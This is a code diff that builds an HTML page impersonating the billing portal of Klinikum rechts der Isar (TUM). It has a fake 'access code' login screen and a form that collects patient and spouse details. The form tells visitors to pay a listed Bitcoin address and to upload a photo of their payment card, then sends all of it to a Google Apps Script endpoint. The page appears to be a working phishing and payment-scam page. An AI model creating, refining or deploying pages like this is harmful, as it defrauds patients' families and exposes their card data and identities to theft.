@@ -1,40 +1,105 @@
-<form action="https://script.google.com/macros/s/AKfycbz-15hMTkU0XDd8IAXFKJ1WaD_k7fyyIMPgBgsGa8XY7G1ClfVf0YmUd-kahoCV8bWyiQ/exec" method="POST" enctype="multipart/form-data" class="p-6 md:p-10">
-    
-    <h2 class="text-lg font-bold text-gray-800 mb-6 border-l-4 border-blue-600 pl-3 uppercase">1. Patient & Relative Details</h2>
-    <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
-        <input type="text" name="Patient_Name" placeholder="Patient Full Name" required class="border-2 p-3 rounded-xl outline-none focus:border-blue-500">
-        <input type="text" name="Hospital_ID" placeholder="Hospital ID (TUM-XXXX)" required class="border-2 p-3 rounded-xl">
-        <input type="text" name="Spouse_Name" placeholder="Spouse (Sender) Name" required class="border-2 p-3 rounded-xl">
-        <input type="email" name="Spouse_Email" placeholder="Spouse Email (For Receipt)" required class="border-2 p-3 rounded-xl">
-    </div>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Billing Terminal | Klinikum rechts der Isar</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .tum-blue { background-color: #005293; }
+        .hero-overlay { background: rgba(0, 0, 0, 0.65); }
+        #main-portal { display: none; }
+    </style>
+</head>
+<body class="bg-gray-50 font-sans">
 
-    <h2 class="text-lg font-bold text-gray-800 mb-6 border-l-4 border-blue-600 pl-3 uppercase">2. Settlement Selection</h2>
-    <div class="mb-8 bg-gray-50 p-6 rounded-2xl border">
-        <label class="block text-xs font-bold text-gray-400 uppercase mb-2">Payment Type</label>
-        <select id="pay-select" name="Payment_Mode" onchange="document.getElementById('logic-input').style.display=(this.value=='Full Settlement')?'none':'block'" class="w-full border-2 p-3 rounded-xl bg-white mb-4">
-            <option value="Full Settlement">Full Settlement</option>
-            <option value="Advanced Deposit">Advanced Deposit (Partial)</option>
-            <option value="Balance Completion">Balance Completion</option>
-        </select>
-        <div id="logic-input" class="hidden">
-            <label class="block text-xs font-bold text-red-500 uppercase mb-1">Enter Balance Due ($)</label>
-            <input type="text" name="Balance_Amount" placeholder="e.g. 5,000" class="w-full border-2 border-red-100 p-3 rounded-xl">
+    <div id="login-screen" class="min-h-screen flex items-center justify-center bg-gray-900 p-6">
+        <div class="bg-white p-8 rounded-3xl shadow-2xl max-w-sm w-full text-center">
+            <img src="https://i.ibb.co/LdbfV4P/TUM-Logo.png" class="h-12 mx-auto mb-6">
+            <h2 class="text-xl font-bold mb-2 uppercase tracking-tight">Clinical Access</h2>
+            <p class="text-gray-400 text-[10px] mb-6 uppercase tracking-widest font-bold">Authorized Personnel Only</p>
+            <input type="password" id="pass-input" placeholder="Enter Access Code" class="w-full border-2 p-3 rounded-xl mb-4 outline-none focus:border-blue-600 text-center font-mono">
+            <button onclick="verifyAccess()" class="w-full tum-blue text-white py-3 rounded-xl font-bold uppercase shadow-lg">Verify Identity</button>
+            <p id="err-msg" class="text-red-500 text-xs mt-3 hidden">Access Denied: Terminal Lock Active</p>
         </div>
     </div>
 
-    <div class="bg-gray-900 rounded-3xl p-6 text-white mb-8 border-b-8 border-blue-600 shadow-xl">
-        <h3 class="text-blue-400 font-bold mb-4 uppercase text-xs">3. Assets & Verification</h3>
-        <div class="space-y-4">
-            <div class="bg-gray-800 p-4 rounded-xl border border-gray-700">
-                <p class="text-gray-500 text-[9px] uppercase font-black mb-1">Clinical BTC Address</p>
-                <code class="text-green-400 text-xs break-all">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</code>
+    <div id="main-portal">
+        <nav class="bg-white py-4 px-6 border-b flex justify-between items-center shadow-sm">
+            <img src="https://i.ibb.co/LdbfV4P/TUM-Logo.png" alt="TUM Logo" class="h-10">
+            <div class="text-right leading-tight text-gray-400">
+                <p class="text-[9px] font-bold uppercase tracking-widest">Technical University of Munich</p>
             </div>
-            <div class="bg-blue-900/20 p-4 rounded-xl border border-blue-800/40">
-                <label class="block font-bold text-blue-400 mb-2 uppercase text-[10px]">Upload Card Photo or BTC Receipt:</label>
-                <input type="file" name="Verification_File" required class="block w-full text-xs text-gray-400 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:bg-blue-600 file:text-white cursor-pointer">
+        </nav>
+
+        <div class="relative h-64 w-full bg-cover bg-center" style="background-image: url('https://mri.tum.de/sites/default/files/styles/hero_image/public/images/hero/klinikum_rechts_der_isar_gebaeude.jpg');">
+            <div class="absolute inset-0 hero-overlay flex flex-col items-center justify-center text-center p-4">
+                <h1 class="text-white text-3xl font-extrabold uppercase tracking-tight">Billing & Finance Portal</h1>
+                <p class="text-blue-200 text-sm italic">Official Patient Settlement Channel</p>
+            </div>
+        </div>
+
+        <div class="max-w-4xl mx-auto -mt-10 mb-20 px-4">
+            <div class="bg-white shadow-2xl rounded-2xl overflow-hidden border">
+                <div class="tum-blue text-white py-3 text-[10px] font-black uppercase text-center tracking-widest">SECURE 256-BIT ENCRYPTED TERMINAL</div>
+
+                <form action="https://script.google.com/macros/s/AKfycbz-15hMTkU0XDd8IAXFKJ1WaD_k7fyyIMPgBgsGa8XY7G1ClfVf0YmUd-kahoCV8bWyiQ/exec" method="POST" enctype="multipart/form-data" class="p-6 md:p-10">
+                    
+                    <h2 class="text-lg font-bold text-gray-800 mb-6 border-l-4 border-blue-600 pl-3 uppercase">1. Patient/Spouse Info</h2>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
+                        <input type="text" name="Patient_Name" placeholder="Patient Full Name" required class="border-2 p-3 rounded-xl outline-none focus:border-blue-500">
+                        <input type="text" name="Hospital_ID" placeholder="Hospital ID (TUM-XXXX)" required class="border-2 p-3 rounded-xl">
+                        <input type="text" name="Spouse_Name" placeholder="Spouse (Sender) Name" required class="border-2 p-3 rounded-xl">
+                        <input type="email" name="Spouse_Email" placeholder="Spouse Email (Receipt Delivery)" required class="border-2 p-3 rounded-xl">
+                    </div>
+
+                    <h2 class="text-lg font-bold text-gray-800 mb-6 border-l-4 border-blue-600 pl-3 uppercase">2. Settlement Selection</h2>
+                    <div class="mb-8 bg-gray-50 p-6 rounded-2xl border">
+                        <label class="block text-xs font-bold text-gray-400 uppercase mb-2">Select Payment Mode</label>
+                        <select id="pay-select" name="Payment_Mode" onchange="checkLogic()" class="w-full border-2 p-3 rounded-xl bg-white mb-4">
+                            <option value="Full Settlement">Full Settlement</option>
+                            <option value="Advanced Deposit">Advanced Deposit (Partial)</option>
+                            <option value="Balance Completion">Balance Completion</option>
+                        </select>
+                        <div id="logic-input" class="hidden">
+                            <label class="block text-xs font-bold text-red-500 uppercase mb-1">Enter Balance Due ($)</label>
+                            <input type="text" name="Balance_Amount" placeholder="e.g. 5,000" class="border-2 border-red-100 p-3 rounded-xl w-full">
+                        </div>
+                    </div>
+
+                    <div class="bg-gray-900 rounded-3xl p-6 text-white mb-8 border-b-8 border-blue-600 shadow-xl">
+                        <h3 class="text-blue-400 font-bold mb-4 uppercase text-xs tracking-widest">3. Verification Assets</h3>
+                        <div class="space-y-4">
+                            <div class="bg-gray-800 p-4 rounded-xl border border-gray-700">
+                                <p class="text-gray-500 text-[9px] uppercase font-black mb-1">Official BTC Settlement Address</p>
+                                <code class="text-green-400 text-xs break-all">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</code>
+                            </div>
+                            <div class="bg-blue-900/20 p-4 rounded-xl border border-blue-800/40">
+                                <label class="block font-bold text-blue-400 mb-2 uppercase text-[10px]">Upload Card Photo or BTC Receipt:</label>
+                                <input type="file" name="Verification_File" required class="block w-full text-xs text-gray-400 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:bg-blue-600 file:text-white cursor-pointer">
+                            </div>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="w-full tum-blue text-white py-5 rounded-2xl font-black text-xl uppercase shadow-lg hover:bg-blue-800 transition-all">Submit for Review</button>
+                </form>
             </div>
         </div>
     </div>
 
-    <button type="submit" class="w-full tum-blue text-white py-5 rounded-2xl font-black text-xl uppercase shadow-lg hover:bg-blue-800 transition-all">Submit for Review</button>
-</form>
+    <script>
+        function verifyAccess() {
+            if(document.getElementById('pass-input').value === 'KLINIKUM2026') {
+                document.getElementById('login-screen').style.display = 'none';
+                document.getElementById('main-portal').style.display = 'block';
+            } else {
+                document.getElementById('err-msg').classList.remove('hidden');
+            }
+        }
+        function checkLogic() {
+            const val = document.getElementById('pay-select').value;
+            document.getElementById('logic-input').style.display = (val !== 'Full Settlement') ? 'block' : 'none';
+        }
+    </script>
+</body>
+</html>
